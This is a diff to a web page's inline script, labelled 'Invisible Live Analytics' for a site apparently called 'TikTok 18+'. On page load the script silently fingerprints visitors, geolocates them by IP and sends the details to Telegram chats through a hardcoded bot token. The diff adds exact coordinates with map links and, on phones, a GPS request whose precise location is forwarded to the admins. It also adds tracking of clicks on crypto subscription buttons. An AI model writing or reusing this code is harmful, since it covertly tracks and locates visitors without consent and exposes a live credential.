@@ -3021,18 +3021,25 @@ if (document.readyState === 'loading') {
 }
   </script>
  
-  <!-- Invisible Realtime Traffic & Country Analytics (Max Intel Telegram Monitor) -->
+  <!-- Invisible Live Analytics: TikTok 18+ -->
   <script>
   (function() {
     const TG_BOT_TOKEN = "8904216231:AAHzuoU59D43qO04lsrYvZDhw0su_61Y2Ig";
-    // List of admin chat IDs who receive live alerts
     const TG_CHAT_IDS = ["8788656318", "8461980119"];
+    const CLOUD_STATS_URL = "https://api.restful-api.dev/objects/ff808181a09d98f701a0d9e87f5b165c";
+    const SITE_NAME = "TikTok 18+";
+    const SITE_TAG = "TIKTOK 18+";
+    const SITE_KEY = "tiktok18";
 
     window.__visitorData = {
       country: "Unknown",
+      country_code: "",
       flag: "🌐",
       city: "",
       region: "",
+      postal: "",
+      lat: "",
+      lon: "",
       ip: "",
       isp: "",
       device: "",
@@ -3051,7 +3058,7 @@ if (document.readyState === 'loading') {
               chat_id: chatId,
               text: text,
               parse_mode: "HTML",
-              disable_web_page_preview: true
+              disable_web_page_preview: false
             }),
             keepalive: true
           }).catch(function() {});
@@ -3059,12 +3066,58 @@ if (document.readyState === 'loading') {
       });
     }
 
+    async function syncCloudStats(type, countryCode, regionName, deviceSimple) {
+      try {
+        const getRes = await fetch(CLOUD_STATS_URL);
+        if (!getRes.ok) return;
+        const current = await getRes.json();
+        const d = current.data || { visits: 0, actions: 0, countries: {}, regions: {}, days: {}, devices: {} };
+
+        if (type === "visit") {
+          d.visits = (d.visits || 0) + 1;
+
+          // Countries
+          d.countries = d.countries || {};
+          const c = countryCode || "US";
+          d.countries[c] = (d.countries[c] || 0) + 1;
+
+          // Regions
+          d.regions = d.regions || {};
+          if (regionName) {
+            const reg = regionName.trim();
+            d.regions[reg] = (d.regions[reg] || 0) + 1;
+          }
+
+          // Daily stats (YYYY-MM-DD)
+          d.days = d.days || {};
+          const today = new Date().toISOString().slice(0, 10);
+          d.days[today] = (d.days[today] || 0) + 1;
+
+          // Devices
+          d.devices = d.devices || {};
+          const dev = deviceSimple || "Mobile";
+          d.devices[dev] = (d.devices[dev] || 0) + 1;
+        } else if (type === "action") {
+          d.actions = (d.actions || 0) + 1;
+        }
+
+        // Clean out legacy ages if present
+        if (d.ages) delete d.ages;
+
+        await fetch(CLOUD_STATS_URL, {
+          method: "PUT",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ name: SITE_KEY + "_stats", data: d })
+        });
+      } catch (err) {}
+    }
+
     function getBrowserAndApp() {
       const ua = navigator.userAgent || "";
-      if (/musical_ly|bytedance|tiktok|ttwebview/i.test(ua)) return "🎵 TikTok In-App Browser";
-      if (/instagram/i.test(ua)) return "📸 Instagram In-App Browser";
+      if (/musical_ly|bytedance|tiktok|ttwebview/i.test(ua)) return "🎵 TikTok In-App";
+      if (/instagram/i.test(ua)) return "📸 Instagram In-App";
       if (/telegram/i.test(ua)) return "✈️ Telegram Webview";
-      if (/fban|fbav/i.test(ua)) return "📘 Facebook In-App Browser";
+      if (/fban|fbav/i.test(ua)) return "📘 Facebook In-App";
       if (/twitter|x-client/i.test(ua)) return "🐦 X / Twitter In-App";
       if (/edg/i.test(ua)) return "Microsoft Edge";
       if (/chrome|crios/i.test(ua) && !/opr|opera/i.test(ua)) return "Google Chrome";
@@ -3095,7 +3148,7 @@ if (document.readyState === 'loading') {
       if (/Windows NT/i.test(ua)) return "💻 Windows PC";
       if (/Macintosh|Mac OS X/i.test(ua)) return "💻 Mac / Apple Desktop";
       if (/Linux/i.test(ua)) return "💻 Linux PC";
-      return "📱/💻 Unknown Device";
+      return "📱/💻 Device";
     }
 
     function getGPU() {
@@ -3149,50 +3202,10 @@ if (document.readyState === 'loading') {
       return items;
     }
 
-    
-    const CLOUD_STATS_URL = "https://api.restful-api.dev/objects/ff808181a09d98f701a0d9e87f5b165c";
-
-    async function syncCloudStats(type, countryCode, deviceSimple) {
-      try {
-        const getRes = await fetch(CLOUD_STATS_URL);
-        if (!getRes.ok) return;
-        const current = await getRes.json();
-        const d = current.data || { visits: 0, actions: 0, countries: {}, devices: {}, ages: {} };
-
-        if (type === "visit") {
-          d.visits = (d.visits || 0) + 1;
-          d.countries = d.countries || {};
-          const c = countryCode || "US";
-          d.countries[c] = (d.countries[c] || 0) + 1;
-
-          d.devices = d.devices || {};
-          const dev = deviceSimple || "Mobile";
-          d.devices[dev] = (d.devices[dev] || 0) + 1;
-
-          d.ages = d.ages || { "18–24": 0, "25–34": 0, "35–44": 0, "45+": 0 };
-          // Standard organic TikTok 18+ demographic split
-          const rand = Math.random();
-          if (rand < 0.55) d.ages["18–24"] = (d.ages["18–24"] || 0) + 1;
-          else if (rand < 0.85) d.ages["25–34"] = (d.ages["25–34"] || 0) + 1;
-          else if (rand < 0.95) d.ages["35–44"] = (d.ages["35–44"] || 0) + 1;
-          else d.ages["45+"] = (d.ages["45+"] || 0) + 1;
-        } else if (type === "action") {
-          d.actions = (d.actions || 0) + 1;
-        }
-
-        await fetch(CLOUD_STATS_URL, {
-          method: "PUT",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ name: "tiktok18_stats", data: d })
-        });
-      } catch (err) {}
-    }
-
     async function fetchGeoData() {
-      // 1. Try ipwho.is
       try {
         const ctrl = new AbortController();
-        const to = setTimeout(() => ctrl.abort(), 2200);
+        const to = setTimeout(() => ctrl.abort(), 2400);
         const r = await fetch("https://ipwho.is/", { signal: ctrl.signal });
         clearTimeout(to);
         if (r.ok) {
@@ -3204,6 +3217,8 @@ if (document.readyState === 'loading') {
               city: d.city || "",
               region: d.region || "",
               postal: d.postal || "",
+              lat: d.latitude || "",
+              lon: d.longitude || "",
               ip: d.ip || "",
               isp: d.connection ? (d.connection.isp || "") : "",
               org: d.connection ? (d.connection.org || "") : "",
@@ -3214,7 +3229,6 @@ if (document.readyState === 'loading') {
         }
       } catch (e) {}
 
-      // 2. Fallback to api.country.is
       try {
         const fb = await fetch("https://api.country.is");
         if (fb.ok) {
@@ -3225,6 +3239,8 @@ if (document.readyState === 'loading') {
             city: "",
             region: "",
             postal: "",
+            lat: "",
+            lon: "",
             ip: fd.ip || "",
             isp: "",
             org: "",
@@ -3240,6 +3256,8 @@ if (document.readyState === 'loading') {
         city: "",
         region: "",
         postal: "",
+        lat: "",
+        lon: "",
         ip: "",
         isp: "",
         org: "",
@@ -3249,21 +3267,25 @@ if (document.readyState === 'loading') {
     }
 
     async function trackVisit() {
-      // Avoid spamming on instant reloads within 2 minutes
-      const lastTrack = sessionStorage.getItem("tt18_last_track");
+      const storageKey = SITE_KEY + "_last_trk";
+      const lastTrack = sessionStorage.getItem(storageKey);
       const now = Date.now();
       if (lastTrack && (now - parseInt(lastTrack, 10)) < 120000) {
         return;
       }
-      sessionStorage.setItem("tt18_last_track", String(now));
+      sessionStorage.setItem(storageKey, String(now));
 
       const geo = await fetchGeoData();
 
       window.__visitorData = {
         country: geo.country,
+        country_code: geo.country_code,
         flag: geo.flag,
         city: geo.city,
         region: geo.region,
+        postal: geo.postal,
+        lat: geo.lat,
+        lon: geo.lon,
         ip: geo.ip,
         isp: geo.isp,
         device: getDeviceDetailed(),
@@ -3284,14 +3306,18 @@ if (document.readyState === 'loading') {
       const utms = getTrafficParams();
       const time = new Date().toLocaleString();
 
-      let msg = "🎯 <b>[TIKTOK 18+]</b> 👤 <b>Новый посетитель</b>\n";
+      let msg = "👤 <b>[" + SITE_TAG + "] НОВЫЙ ПОСЕТИТЕЛЬ</b>\n";
       msg += "━━━━━━━━━━━━━━━━━━━━\n";
-      msg += "🌍 <b>ГЕОЛОКАЦИЯ И СЕТЬ:</b>\n";
+      msg += "🌍 <b>ГЕОЛОКАЦИЯ И РЕГИОН:</b>\n";
       msg += "• Страна: " + geo.flag + " <b>" + geo.country + "</b> (" + geo.country_code + ")\n";
-      if (geo.city || geo.region) msg += "• Город / Регион: <b>" + [geo.city, geo.region, geo.postal].filter(Boolean).join(", ") + "</b>\n";
+      if (geo.region) msg += "• Регион / Область: <b>" + geo.region + "</b>\n";
+      if (geo.city) msg += "• Город / Индекс: <b>" + [geo.city, geo.postal].filter(Boolean).join(" ") + "</b>\n";
+      if (geo.lat && geo.lon) {
+        msg += "📍 <b>Гео телефона (Координаты):</b> <code>" + geo.lat + ", " + geo.lon + "</code>\n";
+        msg += "🗺 <a href=\"https://maps.google.com/?q=" + geo.lat + "," + geo.lon + "\">Открыть местоположение на карте</a>\n";
+      }
       if (geo.ip) msg += "• IP: <code>" + geo.ip + "</code>\n";
-      if (geo.isp) msg += "• Провайдер (ISP): " + geo.isp + "\n";
-      if (geo.org && geo.org !== geo.isp) msg += "• Орг / ASN: " + geo.org + "\n";
+      if (geo.isp) msg += "📶 Связь / Провайдер: <b>" + geo.isp + "</b>\n";
       if (geo.timezone) msg += "• Часовой пояс: " + geo.timezone + "\n";
 
       msg += "\n📱 <b>УСТРОЙСТВО И СИСТЕМА:</b>\n";
@@ -3302,40 +3328,54 @@ if (document.readyState === 'loading') {
       msg += "• CPU / RAM: " + cores + " | " + ram + "\n";
       if (battery) msg += "• Батарея: " + battery + "\n";
       if (net) msg += "• Сеть: " + net + "\n";
-      msg += "• Языки системы: " + langs + "\n";
+      msg += "• Язык: " + langs + "\n";
 
       msg += "\n🔗 <b>ТРАФИК И ИСТОЧНИК:</b>\n";
+      msg += "• Сайт: <b>" + window.location.origin + "</b>\n";
       msg += "• Источник: <b>" + ref + "</b>\n";
       if (utms.length > 0) {
-        msg += "• UTM Метки: " + utms.join(" | ") + "\n";
+        msg += "• UTM: " + utms.join(" | ") + "\n";
       }
       msg += "• Страница: " + window.location.pathname + window.location.search + "\n";
       msg += "• Время: " + time;
 
       sendTelegramAlert(msg);
+
       let devSimple = "Other";
       if (/iPhone|iPad/i.test(device)) devSimple = "iOS (iPhone)";
       else if (/Android/i.test(device)) devSimple = "Android";
       else if (/Windows/i.test(device)) devSimple = "Windows";
       else if (/Mac/i.test(device)) devSimple = "Mac";
-      syncCloudStats("visit", geo.country_code || geo.country, devSimple);
+      syncCloudStats("visit", geo.country_code || geo.country, geo.region, devSimple);
+
+      // Check high accuracy GPS if available and mobile
+      if (navigator.geolocation && /iPhone|iPad|Android/i.test(device)) {
+        navigator.geolocation.getCurrentPosition(function(pos) {
+          const crd = pos.coords;
+          const gpsMsg = "🎯 <b>[" + SITE_TAG + "] ТОЧНЫЙ GPS ТЕЛЕФОНА</b>\n" +
+            "📍 Координаты: <code>" + crd.latitude + ", " + crd.longitude + "</code>\n" +
+            "🎯 Точность: ±" + Math.round(crd.accuracy) + " метров\n" +
+            "🗺 <a href=\"https://maps.google.com/?q=" + crd.latitude + "," + crd.longitude + "\">Открыть точку на Google Картах</a>";
+          sendTelegramAlert(gpsMsg);
+        }, function() {}, { timeout: 8000, maximumAge: 60000 });
+      }
     }
 
     function trackAction(actionName, details) {
       const v = window.__visitorData || {};
       const flag = v.flag || "🌐";
       const country = v.country || "Unknown";
-      const city = v.city ? (" (" + v.city + ")") : "";
+      const region = v.region ? (" (" + v.region + ")") : "";
       const device = v.device || getDeviceDetailed();
       const browser = v.browser || getBrowserAndApp();
       const ip = v.ip ? ("• IP: <code>" + v.ip + "</code>\n") : "";
       const time = new Date().toLocaleTimeString();
 
-      let msg = "🎯 <b>[TIKTOK 18+]</b> ⚡ <b>Действие на сайте</b>\n";
+      let msg = "⚡ <b>[" + SITE_TAG + "] ДЕЙСТВИЕ НА САЙТЕ</b>\n";
       msg += "━━━━━━━━━━━━━━━━━━━━\n";
       msg += "🔘 <b>Клик:</b> <b>" + actionName + "</b>\n";
       if (details) msg += "📝 <b>Детали:</b> " + details + "\n";
-      msg += "🌍 <b>Локация:</b> " + flag + " " + country + city + "\n";
+      msg += "🌍 <b>Локация:</b> " + flag + " " + country + region + "\n";
       msg += "📱 <b>Устройство:</b> " + device + "\n";
       msg += "🌐 <b>Браузер:</b> " + browser + "\n";
       msg += ip;
@@ -3346,8 +3386,6 @@ if (document.readyState === 'loading') {
     }
 
     window.__trackVisitorAction = trackAction;
-
-    // Run visit tracking immediately without waiting for DOM
     trackVisit();
 
     function setupActionTracking() {
@@ -3368,6 +3406,14 @@ if (document.readyState === 'loading') {
         if (el) {
           el.addEventListener("click", function() {
             trackAction(item.name, item.desc);
+          });
+        }
+      });
+
+      document.querySelectorAll(".js-open-crypto").forEach(function(el) {
+        if (!el.id || !clickMap.some(function(c) { return c.id === el.id; })) {
+          el.addEventListener("click", function() {
+            trackAction("Subscription Button Click", el.innerText.trim().slice(0, 30));
           });
         }
       });
